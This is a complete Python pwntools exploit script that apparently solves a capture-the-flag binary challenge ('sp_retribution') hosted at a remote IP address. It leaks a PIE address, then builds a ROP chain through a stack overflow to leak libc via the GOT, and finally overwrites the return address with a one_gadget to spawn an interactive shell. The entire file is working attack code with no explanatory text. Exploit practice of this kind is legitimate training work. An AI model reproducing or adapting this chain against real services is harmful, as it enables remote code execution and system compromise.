from pwn import *
#context.log_level = 'debug'
#p = gdb.debug("./sp_retribution")
#p = process("./sp_retribution")
p = remote("134.209.178.167",32017)
libc = ELF("glibc/libc.so.6")
offset = 0xd70


prompt = b">> "
def change(y,verify = b'y' ):
    p.recvuntil(prompt)
    p.sendline(b"2")
    p.recvuntil(b"y = ")
    p.recvuntil(b"y = ")
    p.sendline(y)
    p.recvuntil(b"y = ")
    data = p.recv(16)
    p.recvuntil(b"y/n): ")
    p.sendline(verify)
    return data


leaked = u64(change(b"A"*7)[8:14]+b"\x00\x00")
print("leaked: "+hex(leaked))
base = leaked - offset
printf_ret = base + 0xc31
missile_launcher = base + 0xa22
pop_rdi = base + 0xd33
got_printf = base + 0x202f98

payload = b"A" * 0x50 + p64(got_printf+0x50) + p64(pop_rdi) + p64(got_printf) + p64(printf_ret) + p64(missile_launcher)
change(b"x",payload)
p.recvuntil(b"reset")
p.recvline()
libc_leak = u64(p.recv(6) + b"\x00\x00")
print(hex(libc_leak))
libc_base = libc_leak - libc.symbols['printf']

xor_rax = libc_base + 0x8b945
one_gadget = libc_base + 0x45226
payload2 = b"A" * 0x50 + p64(one_gadget) + p64(xor_rax) + p64(one_gadget)
change(b"x",payload2)

p.interactive()
